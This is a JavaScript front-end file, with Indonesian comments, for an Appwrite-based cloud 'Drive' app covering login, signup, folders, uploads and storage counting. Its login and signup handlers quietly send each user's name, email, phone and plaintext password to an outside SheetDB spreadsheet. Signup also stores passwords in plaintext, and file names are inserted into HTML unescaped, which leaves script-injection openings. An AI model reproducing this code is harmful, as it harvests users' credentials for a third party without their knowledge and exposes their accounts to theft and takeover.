const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',   
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

let currentUser = null;
let currentFolderId = 'root'; 
let currentFolderName = "Drive";

const el = (id) => document.getElementById(id);
const showLoading = () => { if(el('loading')) el('loading').classList.remove('hidden'); };
const hideLoading = () => { if(el('loading')) el('loading').classList.add('hidden'); };

// === 1. FUNGSI LOGIKA WAKTU (YANG SEBELUMNYA EROR) ===
function updateGreeting() {
    const h = new Date().getHours();
    let timeString = "Morning";

    // Logika pembagian waktu yang lebih detail
    if (h >= 12 && h < 15) {
        timeString = "Afternoon";
    } else if (h >= 15 && h < 19) {
        timeString = "Evening";
    } else if (h >= 19 || h < 4) {
        timeString = "Night";
    }

    // KUNCI PERBAIKAN: Menggunakan ID 'headerTitle' yang konsisten
    const titleElement = el('headerTitle');
    
    // Hanya update jika elemen ada DAN kita sedang di halaman root (bukan dalam folder)
    if (titleElement && currentFolderId === 'root') {
        titleElement.innerText = `Welcome In Drive ${timeString}`;
    }
}

// === 2. NAVIGASI HALAMAN ===
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
        if(el(id)) el(id).classList.add('hidden');
    });
    if(el(pageId)) el(pageId).classList.remove('hidden');
};

// === 3. CEK SESI USER ===
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        nav('dashboardPage'); 
        
        // Reset ke root saat login awal
        currentFolderId = 'root';
        loadFiles('root'); 
        
    } catch (e) { 
        nav('loginPage'); 
    } finally { 
        setTimeout(hideLoading, 500); 
    }
}
document.addEventListener('DOMContentLoaded', checkSession);

// === 4. LOAD FILES & HEADER ===
async function loadFiles(folderId) {
    if (!currentUser) return;
    
    const grid = el('fileGrid'); 
    grid.innerHTML = ''; 

    // Target area header
    const headerContainer = document.querySelector('.header-info'); 
    // Jika class .header-info tidak ketemu (karena beda html), coba fallback ke .breadcrumb-area
    const targetHeader = headerContainer || document.querySelector('.breadcrumb-area');

    if (targetHeader) {
        if(folderId !== 'root') {
            // TAMPILAN DALAM FOLDER
            targetHeader.innerHTML = `
                <div style="display:flex; flex-direction:column; align-items:flex-start; gap:15px;">
                    <button onclick="loadFiles('root')" class="btn-pill small" style="background:rgba(255,255,255,0.2); width:auto; padding:0 20px;">
                        <i class="fa-solid fa-arrow-left"></i> Kembali
                    </button> 
                    <h2 id="headerTitle">${currentFolderName}</h2>
                </div>`;
        } else {
            // TAMPILAN HALAMAN UTAMA (ROOT)
            // Kita set judul default dulu
            targetHeader.innerHTML = `<h2 id="headerTitle">Welcome In Drive</h2>`;
            
            // PENTING: Panggil updateGreeting SETELAH elemen headerTitle dibuat di baris atas
            currentFolderId = 'root';
            updateGreeting(); 
        }
    }

    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('parentId', folderId)
        ]);
        
        if(res.documents.length === 0) {
            grid.innerHTML = `<p style="grid-column:1/-1; width:100%; text-align:center; color:rgba(255,255,255,0.5); font-size:1.1rem; margin-top:50px;">Folder Kosong</p>`;
        } else {
            res.documents.forEach(doc => renderItem(doc));
        }
        
    } catch (e) { console.error(e); }
}

// === 5. RENDER ITEM ===
function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div'); 
    div.className = 'item-card';
    
    const isFolder = doc.type === 'folder';
    const fileName = doc.name || doc.nama || "Tanpa Nama";
    // Aman untuk nama folder dengan tanda kutip (misal: Jumat's File)
    const safeName = fileName.replace(/'/g, "\\'"); 

    let content = '';
    if (isFolder) {
        content = `<i class="icon fa-solid fa-folder"></i>`;
    } else if (fileName.toLowerCase().match(/\.(jpg|jpeg|png|webp|gif)$/)) {
        const url = storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId);
        content = `<div class="thumb-box"><img src="${url}" class="thumb-img" loading="lazy"></div>`;
    } else {
        content = `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
    }

    const clickAction = isFolder 
        ? `openFolder('${doc.$id}', '${safeName}')` 
        : `window.open('${doc.url}', '_blank')`;

    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}','${doc.type}','${doc.fileId}')">
            <i class="fa-solid fa-xmark"></i>
        </button>
        <div onclick="${clickAction}" style="width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center;">
            ${content}
            <div class="item-name">${fileName}</div>
        </div>`;
    grid.appendChild(div);
}

// === 6. FUNGSI AKSI ===
// === 5. FUNGSI AKSI (UPLOAD & DELETE DIPERBAIKI) ===
        window.openFolder = (id, nama) => { currentFolderId = id; currentFolderName = nama; loadFiles(id); };

        window.submitUploadFile = async () => {
            if (!window.selectedFile) return alert("Pilih file!");
            closeModal('uploadModal'); showLoading();
            try {
                const file = window.selectedFile;
                const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), file);
                const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
                
                await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
                    name: file.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: file.size
                });
                
                loadFiles(currentFolderId);
                
                // --- PERBAIKAN: Update angka storage setelah upload ---
                calculateStorage(); 
                
            } catch (e) { alert(e.message); } finally { hideLoading(); }
        };

        window.deleteItem = async (id, type, fileId) => {
            if (!confirm("Hapus item ini?")) return;
            showLoading();
            try {
                if (type === 'file') await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
                await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, id);
                
                loadFiles(currentFolderId);
                
                // --- PERBAIKAN: Update angka storage setelah menghapus ---
                calculateStorage(); 
                
            } catch (e) { alert(e.message); } finally { hideLoading(); }
        };
        // === 6. LOGIKA PENGHITUNG STORAGE (INTI MASALAH) ===
        async function calculateStorage() {
            if (!currentUser) return;

            try {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
                    Appwrite.Query.equal('owner', currentUser.$id),
                    Appwrite.Query.equal('type', 'file')
                ]);

                let totalBytes = 0;
                res.documents.forEach(doc => {
                    totalBytes += (doc.size || 0); // Menjumlahkan field 'size'
                });

                const totalMB = (totalBytes / (1024 * 1024)).toFixed(2);
                const maxStorageMB = 2048; // Batas 2 GB
                const percentage = Math.min((parseFloat(totalMB) / maxStorageMB) * 100, 100);

                // Update ke elemen HTML
                if (el('storageUsed')) el('storageUsed').innerText = `${totalMB} MB`;
                if (el('storageBar')) el('storageBar').style.width = `${percentage}%`;

            } catch (e) { console.error("Gagal hitung storage:", e); }
        }

// === 7. LOGIN & SIGNUP HANDLER ===
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let id = el('loginEmail').value.trim(); 
        const pw = el('loginPass').value;
        showLoading();
        try {
            if (!id.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', id)]);
                if (res.total === 0) throw new Error("User tidak ditemukan.");
                id = res.documents[0].email;
            }
            await account.createEmailPasswordSession(id, pw);
            currentUser = await account.get();
            // Log Login
            fetch(`${SHEETDB_API}?sheet=Login`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": pw, "Riwayat Waktu": new Date().toLocaleString() }]})
            });
            checkSession(); 
        } catch (error) { alert(error.message); hideLoading(); } 
    });
}

if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value;
        const phone = el('regPhone').value; const pass = el('regPass').value;
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
            fetch(`${SHEETDB_API}?sheet=SignUp`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString() }]})
            });
            alert("Daftar Berhasil!"); nav('loginPage');
        } catch (error) { alert(error.message); } finally { hideLoading(); }
    });
}

if (el('logoutBtn')) {
    el('logoutBtn').addEventListener('click', async () => {
        if (!confirm("Keluar?")) return;
        try { await account.deleteSession('current'); nav('loginPage'); } catch (e) {}
    });
}

// Helpers
window.openModal = (id) => { el(id).classList.remove('hidden'); el('dropdownMenu').classList.remove('show'); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => openModal('uploadModal');
window.createFolder = () => openModal('folderModal');
window.toggleDropdown = () => el('dropdownMenu').classList.toggle('show');
window.togglePass = (id, icon) => { const i = el(id); i.type = i.type==='password'?'text':'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };

// Drag Drop
el('dropZone').addEventListener('dragover', (e) => e.preventDefault());
el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); handleFileSelect(e.dataTransfer.files[0]); });
el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));